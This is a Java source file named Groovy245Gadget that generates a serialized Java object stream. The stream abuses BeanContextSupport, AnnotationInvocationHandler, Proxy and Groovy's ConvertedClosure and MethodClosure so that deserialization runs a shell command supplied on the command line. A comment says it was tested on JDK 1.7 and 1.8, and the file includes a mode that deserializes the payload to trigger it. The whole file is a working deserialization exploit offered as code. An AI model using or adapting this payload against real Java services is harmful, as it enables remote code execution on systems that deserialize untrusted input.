import static java.io.ObjectStreamConstants.STREAM_MAGIC;
import static java.io.ObjectStreamConstants.STREAM_VERSION;
import static java.io.ObjectStreamConstants.TC_BLOCKDATA;
import static java.io.ObjectStreamConstants.TC_CLASS;
import static java.io.ObjectStreamConstants.TC_CLASSDESC;
import static java.io.ObjectStreamConstants.TC_ENDBLOCKDATA;
import static java.io.ObjectStreamConstants.TC_NULL;
import static java.io.ObjectStreamConstants.TC_OBJECT;
import static java.io.ObjectStreamConstants.TC_PROXYCLASSDESC;
import static java.io.ObjectStreamConstants.TC_REFERENCE;
import static java.io.ObjectStreamConstants.TC_STRING;
import static java.io.ObjectStreamConstants.baseWireHandle;

import java.beans.beancontext.BeanContextChildSupport;
import java.beans.beancontext.BeanContextSupport;
import java.io.FileInputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.PrintStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Arrays;
import java.util.Comparator;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

import org.codehaus.groovy.runtime.ConversionHandler;
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

public class Groovy245Gadget
{
    public static void main (String [] args) throws Exception
    {
        if ("exploit".equals (args [0])) {
            writeExploit (args [1]);
        }
        else if ("deser".equals (args [0])) {
            ObjectInputStream ois = new ObjectInputStream (new FileInputStream (args [1]));
            Object obj = ois.readObject ();
            System.out.println (obj);
        }
    }    
    
    /*
     *  Exploit tested with jdk1.7.0_151 and jdk1.8.0_151
     */
    public static void writeExploit (String cmd) throws Exception
    {
        String command = cmd;
        MethodClosure methodClosure = new MethodClosure (command, "execute");
        
        Object[] stream = new Object [] {
            STREAM_MAGIC, STREAM_VERSION,            
            TC_OBJECT,                                                  // B E G I N  java.util.HashMap 
            TC_CLASSDESC,                                               //   B E G I N  ClassDescriptor HashMap
            HashMap.class.getName(),
            0x0507dac1c31660d1L,
            (byte) 3,
            (short) 2,
            (byte) 'F', "loadFactor",
            (byte) 'I', "threshold",
            TC_ENDBLOCKDATA,                                           //   E N D  ClassDescriptor HashMap
            TC_NULL,
            0x3f400000,
            0xc,
            TC_BLOCKDATA,
            (byte)8,
            0x10,
            1,
            /*
             *  Begin of manipulated 
             *  BeanContextSupport
             */
            TC_OBJECT,
            TC_CLASSDESC,
            BeanContextSupport.class.getName(),
            0xbc4820f0918fb90cL,
            (byte) 3,
            (short) 4,
            (byte) 'Z', "designTime",
            (byte) 'Z', "okToUseGui",
            (byte) 'I', "serializable",
            (byte)'L',"locale", TC_STRING, "Ljava/util/Locale;",
            TC_ENDBLOCKDATA,
            TC_CLASSDESC,
            BeanContextChildSupport.class.getName(),
            0x57d4efc704dc7225L,
            (byte) 3,
            (short) 3,
            (byte)'L',"beanContextChildPeer", TC_STRING, "Ljava/beans/beancontext/BeanContextChild;",
            (byte)'L',"pcSupport", TC_STRING, "Ljava/beans/PropertyChangeSupport;",
            (byte)'L', "vcSupport", TC_STRING, "Ljava/beans/VetoableChangeSupport;",
            TC_ENDBLOCKDATA,
            TC_NULL,
            TC_REFERENCE, baseWireHandle + 6,
            TC_OBJECT,
            TC_CLASSDESC,
            "java.beans.PropertyChangeSupport",
            0x58d5d264574860bbL,
            (byte) 3,
            (short) 3,
            (byte) 'I', "propertyChangeSupportSerializedDataVersion",
            (byte)'L',"children", TC_STRING, "Ljava/util/Hashtable;",
            (byte)'L',"source", TC_STRING, "Ljava/lang/Object;",
            TC_ENDBLOCKDATA,
            TC_NULL,
            2,
            TC_NULL,
            TC_REFERENCE, baseWireHandle + 6,
            TC_NULL,
            TC_ENDBLOCKDATA,
            TC_OBJECT,
            TC_CLASSDESC,
            "java.beans.VetoableChangeSupport",
            0xb95bf022ca752f3fL,
            (byte) 3,
            (short) 3,
            (byte) 'I', "vetoableChangeSupportSerializedDataVersion",
            (byte)'L', "children", TC_REFERENCE, baseWireHandle + 8,
            (byte)'L', "source", TC_REFERENCE, baseWireHandle + 9,
            TC_ENDBLOCKDATA,
            TC_NULL,
            2,
            TC_NULL,
            TC_REFERENCE, baseWireHandle + 6,
            TC_NULL,
            TC_ENDBLOCKDATA,
            TC_ENDBLOCKDATA,
            (byte) 0,
            (byte) 1,
            1,
            TC_OBJECT,
            TC_CLASSDESC,
            "java.util.Locale",
            0x7ef811609c30f9ecL,
            (byte) 3,
            (short) 6,
            (byte) 'I', "hashcode",
            (byte)'L', "country", TC_STRING, "Ljava/lang/String;",
            (byte)'L', "extensions", TC_REFERENCE, baseWireHandle + 0xe,
            (byte)'L', "language", TC_REFERENCE, baseWireHandle + 0xe,
            (byte)'L', "script", TC_REFERENCE, baseWireHandle + 0xe,
            (byte)'L', "variant", TC_REFERENCE, baseWireHandle + 0xe,
            TC_ENDBLOCKDATA,
            TC_NULL,
            -1,
            TC_STRING, "US",
            TC_STRING, (short)0,
            TC_STRING, "en",
            TC_REFERENCE, baseWireHandle + 0x11,
            TC_REFERENCE, baseWireHandle + 0x11,
            TC_ENDBLOCKDATA,
            TC_OBJECT,
            TC_CLASSDESC,
            "sun.security.krb5.internal.KRBError",
            0x3291694965773e17L,
            (byte) 3,
            (short) 0,
            TC_ENDBLOCKDATA,
            TC_NULL,
            methodClosure,
            TC_BLOCKDATA, (byte)4, 0,
            TC_ENDBLOCKDATA,
            /*
             * End of manipulated BeanContextSupport
             */
            TC_OBJECT,
            TC_CLASSDESC,
            "sun.reflect.annotation.AnnotationInvocationHandler",
            0x55caf50f15cb7ea5L,
            (byte) 2,
            (short) 2,
            (byte)'L',"memberValues", TC_STRING, "Ljava/util/Map;",
            (byte)'L',"type", TC_STRING, "Ljava/lang/Class;",
            TC_ENDBLOCKDATA,
            TC_NULL,
            TC_OBJECT,
            TC_PROXYCLASSDESC,
            1,
            Map.class.getName(),
            TC_ENDBLOCKDATA,
            TC_CLASSDESC,
            "java.lang.reflect.Proxy",
            0xe127da20cc1043cbL,
            (byte) 2,
            (short) 1,
            (byte)'L',"h", TC_STRING, "Ljava/lang/reflect/InvocationHandler;",
            TC_ENDBLOCKDATA,
            TC_NULL,
            TC_OBJECT,
            TC_CLASSDESC,
            "org.codehaus.groovy.runtime.ConvertedClosure",
            0x10233719f715dd1bL,
            (byte) 2,
            (short) 1,
            (byte)'L',"methodName", TC_REFERENCE, baseWireHandle + 16, // <== fixed TC_REFERENCE, previously 3
            TC_ENDBLOCKDATA,
            TC_CLASSDESC,
            "org.codehaus.groovy.runtime.ConversionHandler",
            0x1023371ad601bc1bL,
            (byte) 2,
            (short) 2,
            (byte)'L',"delegate", TC_REFERENCE, baseWireHandle + 11,  // <== fixed TC_REFERENCE, previously 6
            (byte)'L',"handleCache", TC_STRING, "Ljava/util/concurrent/ConcurrentHashMap;",
            TC_ENDBLOCKDATA,
            TC_NULL,
            //
            //  T H I S   I S   T H E   R E F E R E N C E   T O   M E T H O D C L O S U R E
            //             VVVVVVVV
            TC_REFERENCE, baseWireHandle + 29,                        // <== fixed TC_REFERENCE, previously 8
            TC_NULL,
            TC_STRING, "entrySet",
            TC_CLASS,
            TC_CLASSDESC,
            "java.lang.Override",
            (byte) 0,              
            (short) 0,             
            0,                     
            0,                     
            TC_ENDBLOCKDATA,
            TC_NULL,
            TC_ENDBLOCKDATA
        };            

        byte [] toBytes = util.Converter.toBytes (stream);
        patch_gadget_11 (toBytes);
        new PrintStream (System.out).write (toBytes, 0,
                toBytes.length);
    }

        
    private static void patch_gadget_11 (byte[] bytes)
    {
        /*
         *  First patch references of BCS: Everything +2
         */
        for (int i = 81; i < 973; i++) {
            if (bytes[i] == 0x71 && bytes[i+1] == 0x00 && bytes[i+2] == 0x7e && bytes[i+3] ==0x00) {
                i = i + 4;
                System.err.print("Adjusting reference from: " + bytes[i]);
                if (bytes[i] ==  6) bytes[i] = 8;      
                else if (bytes[i] ==  8) bytes[i] = 10;
                else if (bytes[i] ==  9) bytes[i] = 11; 
                else if (bytes[i] == 14) bytes[i] = 16;  
                else if (bytes[i] == 17) bytes[i] = 19;     
                System.err.println(" to: " + bytes[i]);
            }
        }        
        
        /*
         *  Then: patches for MethodClosure.
         */
        
        for (int i = 973; i< 1690; i++) {
            if (bytes[i] == 0x71 && bytes[i+1] == 0x00 && bytes[i+2] == 0x7e && bytes[i+3] ==0x00) {
                i = i + 4;
                System.err.print("Adjusting reference from: " + bytes[i]);
                if (bytes[i] == 4) bytes[i] = 27;      // "Ljava/lang/Object;"
                if (bytes[i] == 7) bytes[i] = 30;      // "Ljava/lang/String;"
                if (bytes[i] == 1) bytes[i] = 24;      // 
                System.err.println(" to: " + bytes[i]);
            }
        }        
    }
    
}